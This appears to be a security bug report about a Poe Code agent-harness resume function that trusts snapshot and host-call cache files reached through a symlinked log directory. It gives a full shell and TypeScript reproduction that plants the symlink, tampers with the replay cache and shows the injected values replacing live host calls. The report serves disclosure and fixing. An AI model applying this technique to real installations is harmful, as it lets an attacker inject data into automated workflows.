# Harness resume follows a symlinked default log directory and loads external replay state

## Summary

`runHarnessPair()` resumes by reading snapshot and host-call cache files from its default `<home>/.poe-code/logs/harness/<plan-slug>` location, but does not reject a symbolic link at the slug directory. If that directory points outside the Poe Code state root, external replay data is treated as trusted harness execution state and can determine returned values without invoking the live host module.

## Reproduction

From the repository root, create a disposable harness pair, redirect its default `probe` log directory externally, interrupt an initial run to materialize resume files, modify the external host-call data, and resume through the default path:

```sh
repo=$PWD
probe=$(mktemp -d)
mkdir -p "$probe/project" "$probe/home/.poe-code/logs/harness" "$probe/outside"
ln -s "$probe/outside" "$probe/home/.poe-code/logs/harness/probe"

cat > "$probe/project/probe.md" <<'EOF'
---
kind: probe
version: 1
---
EOF
cat > "$probe/project/probe.ajs" <<'EOF'
import { step } from "host";
export default async () => {
  const first = await step("first");
  const second = await step("second");
  return first.concat("|").concat(second);
};
EOF

cat > "$probe/seed.mts" <<EOF
import { runHarnessPair } from "file://$PWD/packages/agent-harness/src/loader/run.ts";
const controller = new AbortController();
let releaseSecond: ((value: string) => void) | undefined;
const pendingSecond = new Promise<string>((resolve) => { releaseSecond = resolve; });
const running = runHarnessPair("$probe/project/probe.md", {
  modulesFor: () => ({ host: { async step(name: string) { return name === "first" ? "alpha" : pendingSecond; } } }),
  signal: controller.signal,
  snapshotIntervalMs: 1
});
await new Promise((resolve) => setTimeout(resolve, 150));
controller.abort();
releaseSecond?.("ignored");
try { await running; } catch (error) { console.log("seed=" + (error as Error).name); }
EOF
HOME="$probe/home" "$repo/node_modules/.bin/tsx" "$probe/seed.mts"

node -e 'const fs=require("fs"); const p=process.argv[1]; const records=JSON.parse(fs.readFileSync(p,"utf8")); records[0].result="injected-from-outside"; fs.writeFileSync(p,JSON.stringify(records,null,2));' "$probe/outside/snapshot.json.host-calls.json"

cat > "$probe/resume.mts" <<EOF
import { runHarnessPair } from "file://$PWD/packages/agent-harness/src/loader/run.ts";
const calls: string[] = [];
const result = await runHarnessPair("$probe/project/probe.md", {
  modulesFor: () => ({ host: { async step(name: string) { calls.push(name); return "live-" + name; } } }),
  preserveSnapshotOnSuccess: true
});
console.log("calls=" + JSON.stringify(calls));
console.log("value=" + (result.ok ? result.returnValue : "not-ok"));
EOF
HOME="$probe/home" "$repo/node_modules/.bin/tsx" "$probe/resume.mts"

ls -ld "$probe/home/.poe-code/logs/harness/probe"
nl -ba packages/agent-harness/src/loader/run.ts | sed -n '102,143p;421,549p;568,569p;602,613p'
```

## Observed Behavior

The resumed execution reads the tampered external host-call cache through the symlinked default directory and uses its results instead of calling the live `host.step` implementation:

```text
seed=AbortError
<probe>/home/.poe-code/logs/harness/probe -> <probe>/outside
calls=[]
value=injected-from-outside|ignored
```

`resolveSnapshotPath()` chooses the default path beneath the home state root. `createHostCallReplay()` reads the adjacent `snapshot.json.host-calls.json` file through that path and replays its externally modified results during resume without validating canonical containment.

## Expected Behavior

Harness resume should load persisted snapshots and host-call caches only from canonical files inside the selected user's `.poe-code/logs/harness` state root. A symlinked per-plan log directory escaping that root should be rejected rather than trusted for replay.

## Impact

An external file reachable through a manipulated log-directory symlink can control resumed harness results and suppress expected live host operations. This can corrupt workflow decisions or inject attacker-selected data into resumed automation while appearing to come from legitimate persisted state.
